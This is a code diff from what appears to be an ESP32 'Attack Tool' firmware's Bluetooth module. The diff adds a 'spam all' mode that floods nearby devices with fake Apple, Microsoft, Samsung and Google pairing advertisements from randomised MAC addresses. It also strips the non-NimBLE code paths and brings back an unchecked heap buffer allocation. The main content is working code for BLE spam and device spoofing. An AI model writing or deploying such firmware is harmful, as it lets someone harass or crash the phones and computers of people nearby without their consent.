@@ -77,37 +77,19 @@ BLEAdvertisementData BLEModules::GetAdvertismentData(EBLEPayloadType type)
 
             uint8_t name_len = Name.length();
 
-            //AdvData_Raw = new uint8_t[7 + name_len];
+            AdvData_Raw = new uint8_t[7 + name_len];
 
-            //AdvData_Raw[i++] = 7 + name_len - 1;
-            //AdvData_Raw[i++] = 0xFF;
-            //AdvData_Raw[i++] = 0x06;
-            //AdvData_Raw[i++] = 0x00;
-            //AdvData_Raw[i++] = 0x03;
-            //AdvData_Raw[i++] = 0x00;
-            //AdvData_Raw[i++] = 0x80;
-            //memcpy(&AdvData_Raw[i], Name.c_str(), name_len);
-            //i += name_len;
-
-            //AdvData.addData(std::string((char *)AdvData_Raw, 7 + name_len));
-
-            uint8_t AdvData_Stack[64]; // Giả sử max length < 64
-            if (7 + name_len > 64) {
-                Serial.println("[ERROR] Microsoft name too long!");
-                return AdvData;
-            }
-            AdvData_Stack[i++] = 7 + name_len - 1;
-            AdvData_Stack[i++] = 0xFF;
-            AdvData_Stack[i++] = 0x06;
-            AdvData_Stack[i++] = 0x00;
-            AdvData_Stack[i++] = 0x03;
-            AdvData_Stack[i++] = 0x00;
-            AdvData_Stack[i++] = 0x80;
-            memcpy(&AdvData_Stack[i], Name.c_str(), name_len);
+            AdvData_Raw[i++] = 7 + name_len - 1;
+            AdvData_Raw[i++] = 0xFF;
+            AdvData_Raw[i++] = 0x06;
+            AdvData_Raw[i++] = 0x00;
+            AdvData_Raw[i++] = 0x03;
+            AdvData_Raw[i++] = 0x00;
+            AdvData_Raw[i++] = 0x80;
+            memcpy(&AdvData_Raw[i], Name.c_str(), name_len);
             i += name_len;
 
-            AdvData.addData(std::string((char *)AdvData_Stack, 7 + name_len));
-            break;
+            AdvData.addData(std::string((char *)AdvData_Raw, 7 + name_len));
             break;
         }
 
@@ -178,10 +160,8 @@ void BLEModules::main()
     blescanres = new LinkedList<BLEScanResult>();
       
     // Initialize BLE
-    #ifdef USE_NIMBLE
     BLEDevice::setScanFilterMode(CONFIG_BTDM_SCAN_DUPL_TYPE_DEVICE);
     BLEDevice::setScanDuplicateCacheSize(200);
-    #endif
     BLEDevice::init("");
     pBLEScan = BLEDevice::getScan();
     ble_initialized = true;
@@ -193,18 +173,12 @@ void BLEModules::main()
 bool BLEModules::ShutdownBLE()
 {
     if(ble_initialized) {
-        #ifdef USE_NIMBLE
         if (pAdvertising->isAdvertising()) // This stupid things is cause continuous crash
             pAdvertising->stop();
         if (pBLEScan->isScanning()) {
             pBLEScan->stop();
             pBLEScan->clearResults();
         }
-        #else
-            pAdvertising->stop();
-            pBLEScan->stop();
-            pBLEScan->clearResults();
-        #endif
         // Deinitialize BLE
         vTaskDelay(10 / portTICK_PERIOD_MS); // need delay to prevent crash
         BLEDevice::deinit();
@@ -242,6 +216,13 @@ void BLEModules::StartMode(BLEScanState mode) {
         executeSwiftpair(Samsung);
     else if (mode == BLE_ATTACK_EXPLOIT_GOOGLE)
         executeSwiftpair(Google);
+    else if (mode == BLE_ATTACK_EXPLOIT_SPAM_ALL) {
+        executeSwiftpair(SourApple, true);
+        executeSwiftpair(AppleJuice, true);
+        executeSwiftpair(Microsoft, true);
+        executeSwiftpair(Samsung, true);
+        executeSwiftpair(Google, true);
+    }
     else if (mode == BLE_ATTACK_SPOOFER_INIT)
         initSpoofer();
     else if (mode == BLE_ATTACK_EXPLOIT_INIT)
@@ -286,20 +267,6 @@ BLEAdvertisementData BLEModules::selectSpooferDevices(uint8_t device_type, uint8
     String adv_type_str = "";
     
     switch(adv_type) {
-        #ifndef USE_NIMBLE
-        case ADV_MODE_NON:
-            pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
-            adv_type_str = "NONN";
-            break;
-        case ADV_MODE_IND:
-            pAdvertising->setAdvertisementType(ADV_TYPE_IND);
-            adv_type_str = "IND";
-            break;
-        case ADV_MODE_SCAN:
-            pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
-            adv_type_str = "SCAN";
-            break;
-        #else
         case ADV_MODE_NON:
             pAdvertising->setAdvertisementType(BLE_GAP_CONN_MODE_NON);
             adv_type_str = "NONN";
@@ -312,7 +279,6 @@ BLEAdvertisementData BLEModules::selectSpooferDevices(uint8_t device_type, uint8
             pAdvertising->setAdvertisementType(BLE_GAP_CONN_MODE_UND);
             adv_type_str = "UND";
             break;
-        #endif
     }
 
     Serial.println("[INFO] BLE Spoofer Ad Type: " + adv_type_str);
@@ -327,18 +293,8 @@ void BLEModules::initSpoofer() {
     }
 
     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
-    #ifndef USE_NIMBLE
-    BLEDevice::init("ESP32 Attack Tool"); 
-    BLEServer *pServer = BLEDevice::createServer();
-    pAdvertising = pServer->getAdvertising();
-    ble_initialized = true;
-    #endif
     esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
-    #ifndef USE_NIMBLE
-    pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
-    #else
     esp_ble_gap_set_rand_addr(null_addr);
-    #endif
 
     Serial.println("[INFO] BLE Spoofer Initialized Successfully!");
 }
@@ -349,20 +305,16 @@ void BLEModules::startSpoofer(uint8_t device_type, uint8_t device_brand, uint8_t
         dummy_addr[i] = random(256);
         if (i == 0) dummy_addr[i] |= 0xC0; // Random non-resolvable
     }
-    #ifdef USE_NIMBLE
     if (!ble_initialized) {
         uint8_t macAddr[6];
         generateRandomMac(macAddr);
         esp_base_mac_addr_set(macAddr);
         esp_ble_gap_set_rand_addr(dummy_addr);
-        BLEDevice::init("ESP32 Attack Tool");
+        BLEDevice::init(espatsettings.bleName.c_str());
         BLEServer *pServer = BLEDevice::createServer();
         pAdvertising = pServer->getAdvertising();
         ble_initialized = true;
     }
-    #else
-    pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
-    #endif
     BLEAdvertisementData oAdvertisementData = selectSpooferDevices(device_type, device_brand, adv_type);
     pAdvertising->addServiceUUID(SERVICE_UUID);
     pAdvertising->setAdvertisementData(oAdvertisementData);
@@ -375,7 +327,6 @@ void BLEModules::startSpoofer(uint8_t device_type, uint8_t device_brand, uint8_t
 }
 
 void BLEModules::stopSpoofer() {
-    #ifdef USE_NIMBLE
     if (ble_initialized && pAdvertising->isAdvertising()) {
         vTaskDelay(50 / portTICK_PERIOD_MS); // Wait for advertisement to stop
         pAdvertising->stop();
@@ -383,9 +334,6 @@ void BLEModules::stopSpoofer() {
         BLEDevice::deinit();
         ble_initialized = false;
     }
-    #else
-    pAdvertising->stop();
-    #endif
     Serial.println("[INFO] Stopping Spoofer Advertisement");
 }
 
@@ -393,15 +341,13 @@ void BLEModules::initSpam() {
     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER); 
 
     esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
-    #ifdef USE_NIMBLE
     esp_ble_gap_set_rand_addr(null_addr);
-    #endif
 
     ble_initialized = true;
     Serial.println("[INFO] BLE Spam Initialized Successfully!");
 }
 
-void BLEModules::executeSwiftpair(EBLEPayloadType type)
+void BLEModules::executeSwiftpair(EBLEPayloadType type, bool forspamall)
 {
     uint8_t macAddr[6];
     generateRandomMac(macAddr);
@@ -415,28 +361,33 @@ void BLEModules::executeSwiftpair(EBLEPayloadType type)
     BLEDevice::init("");
     BLEServer *pServer = BLEDevice::createServer();
     pAdvertising = pServer->getAdvertising();
-    vTaskDelay(40 / portTICK_PERIOD_MS);
+    vTaskDelay(10 / portTICK_PERIOD_MS);
     BLEAdvertisementData advertisementData = GetAdvertismentData(type);
     pAdvertising->addServiceUUID(SERVICE_UUID);
     pAdvertising->setAdvertisementData(advertisementData);
-    #ifndef USE_NIMBLE
-    pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
-    #endif
     pAdvertising->setMinInterval(0x20);
     pAdvertising->setMaxInterval(0x20);
     pAdvertising->setMinPreferred(0x20);
     pAdvertising->setMaxPreferred(0x20);
     pAdvertising->start();
-    if (type == AppleJuice) vTaskDelay(APPLE_JUICE_SPAM_DELAY / portTICK_PERIOD_MS);
-    else if (type == SourApple) vTaskDelay(SOUR_APPLE_SPAM_DELAY / portTICK_PERIOD_MS);
-    else vTaskDelay(SWIFTPAIR_SPAM_DELAY / portTICK_PERIOD_MS);
-    pAdvertising->stop();
-    vTaskDelay(10 / portTICK_PERIOD_MS);
+    if (!forspamall) {
+        if (type == AppleJuice) vTaskDelay(espatsettings.applejuiceSpamDelay / portTICK_PERIOD_MS);
+        else if (type == SourApple) vTaskDelay(espatsettings.sourappleSpamDelay / portTICK_PERIOD_MS);
+        else vTaskDelay(espatsettings.swiftpairSpamDelay / portTICK_PERIOD_MS);
+    } else {
+        vTaskDelay(espatsettings.spamAllDelay / portTICK_PERIOD_MS);
+    }
+    if (pAdvertising->isAdvertising()) {
+            pAdvertising->stop();
+        while (pAdvertising->isAdvertising()) {
+            yield();
+        }
+    }
+    vTaskDelay(40 / portTICK_PERIOD_MS);
     BLEDevice::deinit();
 }
 
 class BLEScanDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
-    #ifdef USE_NIMBLE
     void onResult(BLEAdvertisedDevice *advertisedDevice) {
         extern BLEModules ble;
 
@@ -480,46 +431,6 @@ class BLEScanDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
         }
         
     }
-    #else
-    void onResult(BLEAdvertisedDevice advertisedDevice) override {
-        extern BLEModules ble;
-        if (!bleAnalyzerMode) {
-            bleScanRedraw = true;
-            BLEScanResult bleres;
-            String ble_name;
-            ble_name = advertisedDevice.getName().c_str();
-            if (ble_name.isEmpty()) bleres.name = "<no name>";
-            else bleres.name = ble_name;
-            bleres.rssi = advertisedDevice.getRSSI();
-            bleres.addr = advertisedDevice.getAddress().toString().c_str();
-            if (!low_memory_warning)
-                blescanres->add(bleres);
-            String add_to_buffer;
-            if (!low_memory_warning) {
-                if (ble_name.isEmpty()) add_to_buffer = String(bleres.addr);
-                else add_to_buffer = ble_name;
-            } else add_to_buffer = String("Low Mem! Ignore!");
-            display_buffer->add(add_to_buffer);
-            f (!low_memory_warning) Serial.println("[INFO] Added: " + bleres.name + " (Addr: " + bleres.addr + ")" + " (RSSI: " + String(bleres.rssi) + ")");
-            else Serial.println("[INFO] Low Memory Warning! Ignore: " + bleres.name + " (Addr: " + bleres.addr + ")" + " (RSSI: " + String(bleres.rssi) + ")");
-        } else {
-            ble.ble_analyzer_value++;
-
-            if (ble.ble_analyzer_frames_recvd < 254) 
-                ble.ble_analyzer_frames_recvd++;
-
-            if (ble.ble_analyzer_frames_recvd >= 100) {
-                ble.ble_analyzer_rssi = advertisedDevice.getRSSI();
-                if (advertisedDevice.getName().length() != 0) {
-                    ble.ble_analyzer_device = advertisedDevice.getName().c_str();
-                } else {
-                    ble.ble_analyzer_device = advertisedDevice.getAddress().toString().c_str();
-                }
-                ble.ble_analyzer_frames_recvd = 0;
-            }
-        }
-    }
-    #endif
 };
 
 void BLEModules::scanCompleteCB(BLEScanResults scanResults) {
@@ -530,16 +441,14 @@ void BLEModules::scanCompleteCB(BLEScanResults scanResults) {
 void BLEModules::bleScan() {
     delete blescanres;
     blescanres = new LinkedList<BLEScanResult>();
-    BLEDevice::init("ESP32 Attack Tool - BLE Utility");
+    BLEDevice::init(espatsettings.bleName.c_str());
     ble_initialized = true;
     pBLEScan = BLEDevice::getScan();
     pBLEScan->setAdvertisedDeviceCallbacks(new BLEScanDeviceCallbacks(), false);
     pBLEScan->setActiveScan(true);
     pBLEScan->setInterval(100);
     pBLEScan->setWindow(99);
-    #ifdef USE_NIMBLE
     pBLEScan->setMaxResults(0);
-    #endif
 
     vTaskDelay(100 / portTICK_PERIOD_MS);
     //delay(100);
